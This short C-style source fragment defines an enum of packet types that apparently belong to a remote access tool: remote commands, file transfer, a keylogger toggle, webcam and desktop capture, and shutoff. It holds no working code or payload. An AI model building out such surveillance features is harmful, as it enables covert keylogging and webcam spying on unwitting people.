enum Packets
{
	P_CMD,
	P_MSG,
	P_IMG,
	P_FILE,
	//enable disabe toggle keylog
	P_KEYLOG,
	P_LiveCAM,
	P_SnapCAM,
	P_LiveDESK,
	P_SnapDesk,
	//main shutoff command send this then another packet to shutoff feature
	P_SHUTOFF,
	P_Disconnect
};